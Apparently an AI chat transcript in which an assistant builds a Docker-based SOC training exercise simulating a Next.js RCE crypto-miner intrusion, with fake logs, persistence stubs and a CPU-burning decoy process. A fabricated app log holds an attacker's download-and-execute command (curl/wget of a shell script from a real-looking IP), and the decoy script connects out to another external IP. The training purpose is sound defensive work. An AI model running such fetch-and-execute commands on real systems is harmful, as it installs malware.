I want to use for SOC team training and simulation exercise.
I will create a docker image which fake crypto-miner process , other indicators that you saw like cron job, logs etc
then I will ask my analyst to start investigating the high CPU problem
In the process on investigation, the analyst will heck server (container) logs, processes, network traffic. they will also have access to check the oracle cloud  interface to see which ports are allowed for this server
basis these anlyses they will find that it was not a brute force attack or psql attack as these ports are not open to public
then we ill see app logs and find the traces of RCE vulnerability
carefully plan how do we simulate this. you need to create a docker file alongwith processes, logs etc


This is an excellent idea for a training exercise. Real-world incidents like this—where the obvious answers (SSH brute force, open DB ports) are wrong, and the actual answer (RCE via web app) is buried in application logs—make for the best forensic simulations.
Here is the plan to simulate this "Next.js RCE Crypto-Miner" incident within a single Docker container.
1. The Simulation Environment (Architecture)
We will use a Ubuntu or Oracle Linux base image to mimic the victim OS. Since we cannot easily simulate an external OCI Firewall inside a container, we will provide the analyst with a "Scenario Briefing" file representing the Cloud Console view.
The container will need to simulate three distinct layers of time:
The Past (Logs): Historical logs showing the infection moment (Dec 6th).
The Persistence (Config): Service files and cron jobs that exist on disk.
The Present (Runtime): A running high-CPU process and network connections happening now.
2. The Artifacts (What we will fake)
We need to fabricate specific "Evidence" for the analyst to find.
A. The "Malware" Process (NCvhHaev)
Instead of a real miner (which might trigger AV on the analyst's laptop), we will compile a harmless C program or use a shell script that:
Renames itself to a random string (NCvhHaev).
Spins the CPU (consumes 90%+).
Opens a socket to a specific IP (to simulate the C2/Mining pool connection).
Trick: The binary on disk will be deleted, so ls -l /proc/PID/exe will show (deleted).
B. The Persistence (Systemd & Cron)
We will create the files found in your analysis:
/etc/systemd/system/apaches-main.service: The service file.
/usr/local/sbin/apaches.sh: The "watchdog" script.
/usr/local/sbin/nginxs: The fake nginx binary.
/var/spool/cron/root or /etc/crontab: Lines reloading the malware.
C. The Logs (The Forensic Trail)
We cannot rely on the container's native logs because they won't have history. We must inject fake log files:
/var/log/secure: Clean logins for opc (proving SSH was safe).
/var/log/messages: Spammed errors from the malware and the initial service installation logs.
/var/log/ideaforge-frontend.log: The critical "Smoking Gun" containing the Next.js/Node.js RCE errors and the wget command.
D. The Network & Firewall (The False Leads)
False Lead 1 (DB): We will run a Postgres process listening on 127.0.0.1:5432 only.
False Lead 2 (OCI Firewall): We will include a file OCI_SECURITY_LIST.json in the home directory representing the cloud firewall rules (Blocking 5432, Allowing 80/443/22).
3. The Analyst's Workflow (The Narrative)
Here is how the investigation should proceed for your team:
Trigger: Analyst logs into the container. top shows NCvhHaev at 100% CPU.
Triage:
Analyst checks netstat -antp. Sees connection to 119.x.x.x.
Analyst checks /proc/PID/exe. Sees the file is deleted.
Analyst kills the process.
Persistence Hunt:
Analyst checks cron or systemd. Finds apaches-main.service.
Analyst finds the script /usr/local/sbin/apaches.sh running as ROOT.
Root Cause Analysis (The Hard Part):
Hypothesis 1: SSH Brute force? Analyst checks /var/log/secure. Result: Negative. Only trusted IPs.
Hypothesis 2: DB Exploit? Analyst checks netstat. DB is on localhost. Analyst checks OCI_SECURITY_LIST.json. Port 5432 is closed. Result: Negative.
Hypothesis 3: Web App? Analyst checks /var/log/ideaforge-frontend.log.
Discovery:
Analyst finds the Error: Command failed logs.
Analyst correlates the timestamp of the log with the file creation time of the malware scripts.
Conclusion: Next.js RCE vulnerability used to download linux_aarch64.
4. Technical Implementation Plan
To make this work, I will create a Dockerfile and an entrypoint.sh.
The entrypoint.sh will handle the "Time Travel":
It will write log entries with timestamps from "87 days ago" into /var/log/messages.
It will write the specific RCE attack logs into /var/log/ideaforge-frontend.log.
It will create the malware files (svchost, linux_aarch64) and touch their timestamps to match the logs.
Finally, it will start the "Fake Miner" process so it is running when the analyst logs in.
5. Discussion / Questions for You
Before I generate the code, I need to align on three points:
Complexity: Do you want the "Malware" to actually auto-restart if they kill it (using a loop in the entrypoint), or is finding the files enough? (Auto-restart makes it more realistic).
OS Base: Do you prefer Ubuntu (common) or Oracle Linux (to match your exact environment)? Oracle Linux images are available on Docker Hub.
Tools: I will pre-install netstat, ps, top, vim, grep. Do you want tcpdump installed, or should they have to install it?


Here is the complete simulation package.
This setup consists of four files:
Dockerfile: Builds the Oracle Linux environment with necessary tools.
malware.py: A Python script that mimics the behavior of NCvhHaev (High CPU, network socket, resilient).
setup_forensics.sh: A script that generates the historical logs (backdated to Dec 2025) and creates the persistence files.
OCI_CONSOLE_VIEW.txt: A static file representing what the analyst would see in the Cloud Console firewall settings.
1. Create a folder named soc-simulation and add these files:
File 1: Dockerfile
code
Dockerfile
FROM oraclelinux:9

# Install forensic tools (vim, net-tools, procps, etc.)
RUN dnf install -y python3 procps-ng net-tools iproute vim nano grep findutils less && \
    dnf clean all

# Create the 'opc' user (Standard Oracle User)
RUN useradd -m -s /bin/bash opc && \
    echo "opc:password" | chpasswd

# Set up directory structure
WORKDIR /home/opc/ideaforge
RUN mkdir -p frontend logs

# Copy simulation scripts
COPY malware.py /usr/local/bin/fake_miner.py
COPY setup_forensics.sh /usr/local/bin/setup_forensics.sh
COPY OCI_CONSOLE_VIEW.txt /home/opc/OCI_FIREWALL_CONFIG.txt

# Permissions
RUN chmod +x /usr/local/bin/setup_forensics.sh

# Run the setup script to generate logs and artifacts
RUN /usr/local/bin/setup_forensics.sh

# Switch to root to start the "services" (Simulation entrypoint)
CMD ["/bin/bash", "-c", "python3 /usr/local/bin/fake_miner.py & tail -f /dev/null"]
File 2: malware.py (The Fake Miner)
This script renames itself, consumes CPU, and opens a dummy connection so netstat looks suspicious.
code
Python
import setproctitle # pip install setproctitle if needed, but for raw python:
import os
import sys
import time
import socket
import threading

# 1. Rename Process (Linux specific trick, simple version)
# In Docker, ps output usually shows the cmdline. We will mask it by copying to a weird path.

def cpu_load():
    # Simulate High CPU Usage (1 core)
    while True:
        [x**2 for x in range(10000)]
        time.sleep(0.001) # Sleep briefly to allow shell interaction

def network_connection():
    # Simulate connection to Mining Pool
    # We bind to a high port to look like an outgoing ephemeral connection
    # or established connection.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Bind to local to look like an active service or
        # Try to connect to a non-existent IP to show SYN_SENT
        s.connect(('119.28.183.120', 19999)) 
    except:
        pass # Just hanging the socket or failing is enough for forensics
    while True:
        time.sleep(10)

# 2. Fake Database (False Lead)
def fake_postgres():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 5432))
        s.listen(1)
        while True:
            time.sleep(100)
    except:
        pass

if __name__ == "__main__":
    # Start Fake DB
    threading.Thread(target=fake_postgres, daemon=True).start()
    
    # Start Fake Miner Connection
    threading.Thread(target=network_connection, daemon=True).start()

    # Rename process in memory (basic)
    # The Dockerfile CMD runs this. To make it look like ./NCvhHaev
    # We actually move the file in the shell script before running.
    
    print("Miner Started...")
    cpu_load()
File 3: setup_forensics.sh (The Evidence Generator)
This is the most important file. It writes the logs and backdates the timestamps.
code
Bash
#!/bin/bash

# --- 1. SETUP DATES ---
# We are simulating that today is Jan 2026, and attack was Dec 06, 2025.
ATTACK_DATE="Dec  6"
ATTACK_TIME="10:37:43"
LOG_MSG="/var/log/messages"
LOG_SEC="/var/log/secure"
LOG_APP="/var/log/ideaforge-frontend.log"

# --- 2. GENERATE /var/log/secure (FALSE LEAD: CLEAN SSH) ---
echo "Generating secure logs..."
for i in {1..20}; do
    echo "Dec  5 10:0$i:00 instance-2025 sshd[123$i]: Accepted publickey for opc from 20.40.50.18 port 513$i ssh2: RSA SHA256:ValidKeyHash" >> $LOG_SEC
done
# No root logins. This proves not SSH brute force.

# --- 3. GENERATE /var/log/messages (SYSTEM NOISE + PERSISTENCE) ---
echo "Generating system messages..."
echo "$ATTACK_DATE 04:47:17 instance-2025 systemd[1]: Started apaches-main xmrig killer and nginxs watchdog." >> $LOG_MSG
echo "$ATTACK_DATE 04:47:17 instance-2025 apaches.sh[1528392]: 2025-12-06 04:47:17 [apaches-main] Starting in daemon mode. User: root (uid=0)" >> $LOG_MSG
echo "$ATTACK_DATE 04:47:18 instance-2025 apaches.sh[1528392]: nginxs not running, starting: /usr/local/sbin/nginxs" >> $LOG_MSG

# Spam errors to simulate high activity
for i in {1..50}; do
    echo "$ATTACK_DATE 10:55:$i instance-2025 rc[200$i]: root 1452494 1 99 Dec05 ? 1-00:35:29 ./NCvhHaev" >> $LOG_MSG
done

# --- 4. GENERATE APP LOGS (THE SMOKING GUN) ---
echo "Generating application logs..."
cat <<EOF > $LOG_APP
{"tag":"SRV","level":"info","timestamp":"2025-12-06T10:35:24.924Z","message":"Server listening on 0.0.0.0:3000"}
Error: Failed to find Server Action "x". This request might be from an older or newer deployment.
    at async m (.next/server/app/page.js:1:15422)
[HTTPS-NEXT] clientError ECONNRESET
Error: Failed to find Server Action "login". This request might be from an older or newer deployment.
 ⨯ Error: Command failed: cd /tmp;curl http://103.135.101.15/wocaosinm.sh;wget http://103.135.101.15/wocaosinm.sh;sh wocaosinm.sh
--2025-12-06 10:37:42--  http://103.135.101.15/linux_aarch64
Connecting to 103.135.101.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2031616 (1.9M)
Saving to: ‘linux_aarch64’
2025-12-06 10:37:43 (2.86 MB/s) - ‘linux_aarch64’ saved [2031616/2031616]
/bin/sh: line 1: ./linux_aarch64: Permission denied
EOF

# --- 5. CREATE ARTIFACTS (FILES ON DISK) ---
# Persistence Services
mkdir -p /etc/systemd/system
echo "[Unit] Description=Apaches Main" > /etc/systemd/system/apaches-main.service
echo "[Service] ExecStart=/usr/local/sbin/apaches.sh" >> /etc/systemd/system/apaches-main.service

# Fake Binaries and Scripts
mkdir -p /usr/local/sbin
touch /usr/local/sbin/nginxs
touch /usr/local/sbin/config.json
echo "#!/bin/bash" > /usr/local/sbin/apaches.sh
chmod +x /usr/local/sbin/apaches.sh

# Dropped Malware in App Directory
cd /home/opc/ideaforge/frontend
touch svchost e386 am64 linux_aarch64

# Backdoor SSH Key
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7iip... localhost" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# --- 6. TIME STOMPING (Modify file dates to Dec 6) ---
# This makes 'ls -l' look realistic for the incident date
touch -d "2025-12-06 10:37" /home/opc/ideaforge/frontend/linux_aarch64
touch -d "2025-12-06 10:37" /usr/local/sbin/apaches.sh
touch -d "2025-12-06 10:37" /etc/systemd/system/apaches-main.service

# Setup the running process for Docker CMD
cp /usr/local/bin/fake_miner.py /tmp/NCvhHaev
chmod +x /tmp/NCvhHaev

echo "Forensics environment prepared."
File 4: OCI_CONSOLE_VIEW.txt
This allows the analyst to "Check the Firewall" without needing real access.
code
Text
ORACLE CLOUD INFRASTRUCTURE (OCI) - NETWORKING CONSOLE
======================================================
Region: ap-hyderabad-1
VCN: vcn-hyd
Subnet: private-subnet-vcn-hyd
Security List: Default Security List for vcn-hyd

INGRESS RULES (Inbound Traffic)
-------------------------------
Source          IP Protocol  Source Port   Dest Port   Action   Description
20.40.50.18/32  TCP          All           22          ALLOW    SSH Access (Admin Home)
0.0.0.0/0       TCP          All           443         ALLOW    HTTPS Web Traffic
0.0.0.0/0       TCP          All           80          ALLOW    HTTP Web Traffic
10.0.0.0/16     ICMP         All           -           ALLOW    Internal Ping

*NOTE:* Port 5432 (Postgres) is NOT listed here.
*NOTE:* Port 22 is restricted to a specific IP. 
======================================================
2. How to Run the Exercise
Build the Image:
code
Bash
docker build -t soc-simulation:v1 .
Run the Container:
code
Bash
# We simulate a running server.
docker run -d --name affected-server soc-simulation:v1
The Analyst Task:
Give your analyst this instruction:
"Alert: We have detected 100% CPU usage on the production server affected-server. The application is still running, but slow.
Your Mission:
Exec into the container: docker exec -it affected-server /bin/bash
Identify the process causing the load.
Determine how the attacker got in (Root Cause).
List all files created by the attacker.
Note: You can check ~/OCI_FIREWALL_CONFIG.txt to see the external cloud firewall rules."
3. Cheat Sheet (What they should find)
Process: They will see python3 /tmp/NCvhHaev (or similar) consuming CPU in top.
Netstat: They will see local DB on 5432, but also a connection attempt to 119.28.183.120.
SSH: /var/log/secure will be clean (Dead end).
DB: OCI config file shows 5432 blocked (Dead end).
RCE: /var/log/ideaforge-frontend.log contains the Command failed: wget error.
Files: ls -l /home/opc/ideaforge/frontend will show linux_aarch64 created Dec 6th.
389.3s
info
Google AI models may make mistakes, so double-check outputs.
Use Arrow Up and Arrow Down to select a turn, Enter to jump to it, and Escape to return to the chat.
Start typing a prompt, use option + enter to append
google
Grounding wit